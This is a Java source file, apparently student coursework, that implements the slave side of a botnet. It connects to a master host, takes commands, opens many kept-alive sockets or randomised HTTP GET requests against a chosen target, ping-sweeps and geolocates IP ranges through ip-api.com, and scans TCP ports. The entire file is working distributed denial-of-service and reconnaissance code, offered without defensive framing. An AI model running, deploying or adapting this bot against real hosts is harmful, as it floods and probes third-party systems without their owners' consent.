//Author:Vagdevi Challa
//File:SlaveBot.java

import java.io.*;
import java.net.*;
import java.util.ArrayList;
import java.util.Random;

public class SlaveBot
{
	public static void main(String[] args) throws IOException {
		int portNumber=8080;
		String IPAddress = "127.0.0.1";
		Socket socket = null;
		BufferedReader bufferedReader = null;
		ArrayList<AttackInfo> attackInfoList = new ArrayList<AttackInfo>();
		
		if (args.length != 4 || !(args[0].equals("-h")) || !(args[2].equals("-p"))) {
		      System.err.println("Usage: java SlaveBot -h <host name>  -p <port number>");
		      System.exit(1);
		    }
		else {
			for (int i = 0; i < args.length; i++)
        	{
        		if(args[i].equals("-p"))
        		{
        			portNumber = Integer.parseInt(args[i+1]);

        		}
        		else if(args[i].equals("-h"))
        		{
        			IPAddress=args[i+1];
        		}
        	}
		}
		try {
			socket = new Socket(IPAddress, portNumber);
	        bufferedReader = new BufferedReader(new InputStreamReader(socket.getInputStream()));
			 String userInput;
			 while (true) {
				 userInput = bufferedReader.readLine();
				 //System.out.println("Into While loop");
				if(userInput.length() < 0){
					 continue;
				 }
				 String userInputSplit[] = userInput.split(" ");
				 String targetHost;
				 int targetPort;
				 int numberOfConnections;
				 switch (userInputSplit[0]) {
				case "connect":
					if(userInputSplit.length == 4) {
						targetHost = userInputSplit[2];
						targetPort = Integer.parseInt(userInputSplit[3]);
						numberOfConnections = 1;
						for(int j = 0; j < numberOfConnections; j++){
							Socket connectSocket = new Socket(targetHost,targetPort);
							AttackInfo info = new AttackInfo(targetHost, targetPort, connectSocket);
							attackInfoList.add(info);
							//System.out.println("Inside for Into connect");
						}
					}
					else if(userInputSplit.length == 5) {
						if(!(userInputSplit[4].equals("keepalive")) && !(userInputSplit[4].startsWith("url="))){
							targetHost = userInputSplit[2];
							targetPort = Integer.parseInt(userInputSplit[3]);
							numberOfConnections = Integer.parseInt(userInputSplit[4]);
							for(int j = 0; j < numberOfConnections; j++){
								Socket connectSocket = new Socket(targetHost,targetPort);
								AttackInfo info = new AttackInfo(targetHost, targetPort, connectSocket);
								attackInfoList.add(info);
								//System.out.println("Inside for Into connect");
							}
						}
						else if(userInputSplit[4].equals("keepalive")) {
							targetHost = userInputSplit[2];
							targetPort = Integer.parseInt(userInputSplit[3]);
							numberOfConnections = 1;
							for(int j = 0; j < numberOfConnections; j++){
								Socket connectSocket = new Socket(targetHost,targetPort);
								AttackInfo info = new AttackInfo(targetHost, targetPort, connectSocket);
								attackInfoList.add(info);
								connectSocket.setKeepAlive(true);
								
							}
						}
						else if(userInputSplit[4].substring(0, 4).equals("url=")) {
							targetHost = userInputSplit[2];
							targetPort = Integer.parseInt(userInputSplit[3]);
							numberOfConnections = 1;
							for(int j = 0; j < numberOfConnections; j++){
								//System.out.println("Inside for Into connect url");
								
								String path = "";
								if(targetPort == 80) {
									 path = "http://" + targetHost + userInputSplit[4].substring(4) + randomString();
								}else {
									path = "https://" + targetHost + userInputSplit[4].substring(4) + randomString();
								}
								
								//System.out.println("path is " +path);
								URL url = new URL(path);
								HttpURLConnection httpURLConnection = (HttpURLConnection) url.openConnection();
								httpURLConnection.setRequestMethod("GET");
								httpURLConnection.connect();
								System.out.println("Connected to " +path);
								//int message = httpURLConnection.getResponseCode();
				                BufferedReader in = new BufferedReader(new InputStreamReader(httpURLConnection.getInputStream()));
				                String inputLine;
				                StringBuffer stringBuffer = new StringBuffer();
				                while ((inputLine = in.readLine()) != null){
				                	stringBuffer.append(inputLine);
				                }			              
				                in.close();
							}
						}				
					}
					else if(userInputSplit.length == 6 && userInputSplit[5].equals("keepalive")) {
						targetHost = userInputSplit[2];
						targetPort = Integer.parseInt(userInputSplit[3]);
						numberOfConnections = Integer.parseInt(userInputSplit[4]);
						for(int j = 0; j < numberOfConnections; j++){
							Socket connectSocket = new Socket(targetHost,targetPort);
							AttackInfo info = new AttackInfo(targetHost, targetPort, connectSocket);
							attackInfoList.add(info);
							connectSocket.setKeepAlive(true);
						}
					}
					else if(userInputSplit.length == 6 && userInputSplit[5].substring(0, 4).equals("url=")) {
						targetHost = userInputSplit[2];
						targetPort = Integer.parseInt(userInputSplit[3]);
						numberOfConnections = Integer.parseInt(userInputSplit[4]);
						for(int j = 0; j < numberOfConnections; j++){
							String path = "";
							if(targetPort == 80) {
								 path = "http://" + targetHost + userInputSplit[5].substring(4) + randomString();
							}else {
								path = "https://" + targetHost + userInputSplit[5].substring(4) + randomString();
							}
							//System.out.println("URL is " +path);							
							URL url = new URL(path);							
							HttpURLConnection httpURLConnection = (HttpURLConnection) url.openConnection();
							httpURLConnection.setRequestMethod("GET");
							httpURLConnection.connect();
							System.out.println("Connected to " +path);
			                BufferedReader in = new BufferedReader(new InputStreamReader(httpURLConnection.getInputStream()));
			                String inputLine;
			                StringBuffer stringBuffer = new StringBuffer();
			                while ((inputLine = in.readLine()) != null){
			                	stringBuffer.append(inputLine);
			                }
			                in.close();
						}
					}
					continue;
				case "ipscan":
					String IPAdddressRange = userInputSplit[2];
					String[] IPsplit = IPAdddressRange.split("-");
					IPAddress ip1=new IPAddress(IPsplit[0]);
			        IPAddress ip2=new IPAddress(IPsplit[1]);
			        String all="";
			        do{
			            try{
			                Process process;
			                if(System.getProperty("os.name").startsWith("Windows")){
			                	process = Runtime.getRuntime().exec("ping -n 1 -w 5 " + ip1.toString());//for windows
			                }
			                else if(System.getProperty("os.name").startsWith("Mac")){
			                	process = Runtime.getRuntime().exec("ping -c 1 -t 5 " + ip1.toString());//for unix like
			                }else{
			                	process = Runtime.getRuntime().exec("ping -c 1 -w 5 " + ip1.toString());
			                }
			           
			                BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
			                int flag=0;
			                String line = "";
			                while ((line = reader.readLine())!= null) {
			                if(line.contains("ttl")||line.contains("TTL"))
			                    flag=1;
			                }
			                process.waitFor();
			                
			                if(flag==1)
			                {
			                    
			                    if(all.equals(""))
			                        all=ip1.toString();
			                    else
			                        all=all+", "+ip1.toString();
			                }
			                
			            }catch(Exception e){
			            }
			            ip1=ip1.next();
			        }while(ip1.getValue()<=ip2.getValue());
			        try{
			           PrintWriter printWriter = new PrintWriter(socket.getOutputStream(), true);
			           printWriter.println(all);
			        }catch(Exception e){
			        	
			        }
					continue;
				case "geoipscan":
					String geoIPAdddressRange = userInputSplit[2];
					String[] geoIPsplit = geoIPAdddressRange.split("-");
					IPAddress geoip1=new IPAddress(geoIPsplit[0]);
			        IPAddress geoip2=new IPAddress(geoIPsplit[1]);
			        String geoipscan = "GeoIPScan List :";
			        do{
			        	try{
			        		Process process;
			        		if(System.getProperty("os.name").startsWith("Windows")){
			        			process = Runtime.getRuntime().exec("ping -n 1 -w 5 " + geoip1.toString());//for windows
			        		}
			        		else if(System.getProperty("os.name").startsWith("Mac")){
			        			process = Runtime.getRuntime().exec("ping -c 1 -t 5 " + geoip1.toString());//for unix like
			        		}else{
			        			process = Runtime.getRuntime().exec("ping -c 1 -w 5 " + geoip1.toString());
			        		}
			        		BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
			        		int flag=0;
			        		String line = "";
			        		while ((line = reader.readLine())!= null) {
			        			if(line.contains("ttl")||line.contains("TTL"))
			        				flag=1;
			        			}
			        		process.waitFor();	
			        		
			        		if(flag==1){
			        			if(!(geoipscan.equals("GeoIPScan List:"))){
			        				geoipscan += "\n";
			        			}
			        			String myurlstring = "http://ip-api.com/csv/" + geoip1.toString();
			        			URL myurl = new URL(myurlstring);
			        			URLConnection conn = myurl.openConnection();
			        			BufferedReader conndata = new BufferedReader(new InputStreamReader(conn.getInputStream()));
			        			String geoconn;
			        			// sleep 0.5 s
			        			try {
			        				Thread.sleep(500);
			        			} catch (InterruptedException e) {
			        				// TODO Auto-generated catch block
			        				e.printStackTrace();
			        			}
			        			geoconn = conndata.readLine();
			        			//char ch = geoconn.charAt(0);
			        			//String s=geoconn.substring(0, 7);
			        			ArrayList<String> geoResponse = new ArrayList<String>();
			        			if(geoconn.toLowerCase().startsWith("success")){
			        				String responseData = geoconn.substring(8);
			        				String[] responseDataSplit = responseData.split(",");
			        				for(int j=0 ; j<responseDataSplit.length ; j++)	{
			        					String val = responseDataSplit[j];
			        					if(val.equalsIgnoreCase(geoip1.toString())) {
			        						val = " ";								
			        					}
								    geoResponse.add(val);
			        				}	
								 for(int k = 0; k < geoResponse.size(); k++) {
									 geoipscan = geoipscan + (k == 0 ? geoip1.toString() +", " : ", ") + geoResponse.get(k);
								 }
								 if(geoipscan.endsWith(",  ")){
									 geoipscan = geoipscan.substring(0, geoipscan.length() - 3);
								 }
			        			}
			        		}
			        	}catch(Exception e){
			            }
			        geoip1=geoip1.next();
			        }while(geoip1.getValue()<=geoip2.getValue());
			        try{
				           PrintWriter printWriter = new PrintWriter(socket.getOutputStream(), true);
				           printWriter.println(geoipscan);
				        }catch(Exception e){ 	
				        }
						continue; 
				case "tcpportscan":
					int portStart,portEnd;
					targetHost = userInputSplit[2];
					String portRange = userInputSplit[3];
					String[] portSplit =portRange.split("-");
					portStart = Integer.parseInt(portSplit[0]);
					portEnd = Integer.parseInt(portSplit[1]);
					String portList ="";
					PrintWriter printWriter;
					for(int i=portStart; i<portEnd; i++){
						try{
			               
							Socket scocket = new Socket();
							scocket.connect(new InetSocketAddress(targetHost,i), 3000);
			                printWriter = new PrintWriter(socket.getOutputStream(), true);
			                if(portList.equals(""))
			                	portList=portList+i;
			                else    
			                	portList=portList+", "+i;
			                scocket.close();
			            }catch(Exception e){
			            	
			            }
					}
					try{
				           printWriter = new PrintWriter(socket.getOutputStream(), true);
				           printWriter.println(portList);
				        }catch(Exception e){
				        	
				        }						
					continue;
				case "disconnect":
					targetHost = userInputSplit[2];
					ArrayList<AttackInfo> disconnectlist = new ArrayList<AttackInfo>();
					if(userInputSplit.length == 4) {
						targetPort = Integer.parseInt(userInputSplit[3]);
						for(AttackInfo info : attackInfoList)
                        {
                            if(targetHost.equals(info.getHostname()) && targetPort == info.getPortNumber()) {
                            	info.getSocket().close();
                            	disconnectlist.add(info);                                
                            }
                        }
                        for(AttackInfo info : disconnectlist)
                        {
                        	attackInfoList.remove(info);
                        }
					} 
					else if(userInputSplit.length == 3) {
						for(AttackInfo info : attackInfoList)
                        {
                            if(targetHost.equals(info.getHostname())) {
                            	info.getSocket().close();
                            	disconnectlist.add(info);                                
                            }
                        }
                        for(AttackInfo info : disconnectlist)
                        {
                        	attackInfoList.remove(info);
                        }
					}
					else {
						System.out.println("Please check argumenst for disconnect");
					}
					continue;
				default:
					System.out.println("Please use connect or disconnect to slave");
					continue;
				}
			      }
				}catch (UnknownHostException e) {
			       System.err.println("Don't know about your host");
			       System.exit(1);
			    }catch (IOException e) {
			       System.err.println("Couldn't get I/O for the connection to the host");
			       System.exit(1);
			    } finally {
			    	if (socket != null){
			    		//System.out.println("slave socket close");
			    		socket.close();
			    	}
			    	if (bufferedReader != null){
			    		//System.out.println("Slave bufferreder close");
			    		bufferedReader.close();
			    	}
			    	System.exit(1);
			    }
	}
	
	public static String randomString() {
		
		String characters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";
		Random random = new Random();
		
		int randomnum = random.nextInt(10) + 1;
		String randomtxt = "";
		int i = 0;
		while(i < randomnum)
		{
			
			char singlechar = characters.charAt(random.nextInt(52));
			randomtxt = randomtxt + singlechar;
			i++;
		}
		
		return randomtxt;
	}
}
class AttackInfo{
	private String HostName;
	private int PortNumber;
	private Socket socket;
	public AttackInfo(String HostName, int PortNumber, Socket socket)
    {
        this.HostName = HostName;
        this.PortNumber = PortNumber;
        this.socket = socket;
    }
	 public String getHostname()
	    {
	        return HostName;
	    }
	    public int getPortNumber()
	    {
	        return PortNumber;
	    }
	    public Socket getSocket()
	    {
	        return socket;
	    }

	    public void setHostname(String HostName)
	    {
	        this.HostName = HostName;
	    }
	    public void setPortNumber(int PortNumber)
	    {
	        this.PortNumber = PortNumber;
	    }
	    public void setSocket(Socket socket)
	    {
	        this.socket = socket;
	    }
}
//class to iterate through the ip range
class IPAddress {

  private final int value;

  public IPAddress(int value) {
      this.value = value;
  }

  public IPAddress(String stringValue) {
      String[] parts = stringValue.split("\\.");
      if( parts.length != 4 ) {
          throw new IllegalArgumentException();
      }
      value = 
              (Integer.parseInt(parts[0], 10) << (8*3)) & 0xFF000000 | 
              (Integer.parseInt(parts[1], 10) << (8*2)) & 0x00FF0000 |
              (Integer.parseInt(parts[2], 10) << (8*1)) & 0x0000FF00 |
              (Integer.parseInt(parts[3], 10) << (8*0)) & 0x000000FF;
  }

  public int getOctet(int i) {

      if( i<0 || i>=4 ) throw new IndexOutOfBoundsException();

      return (value >> (i*8)) & 0x000000FF;
  }

  public String toString() {
      StringBuilder sb = new StringBuilder();

      for(int i=3; i>=0; --i) {
          sb.append(getOctet(i));
          if( i!= 0) sb.append(".");
      }

      return sb.toString();

  }

  @Override
  public boolean equals(Object obj) {
      if( obj instanceof IPAddress ) {
          return value==((IPAddress)obj).value;
      }
      return false;
  }

  @Override
  public int hashCode() {
      return value;
  }

  public int getValue() {
      return value;
  }

  public IPAddress next() {
      return new IPAddress(value+1);
  }
}

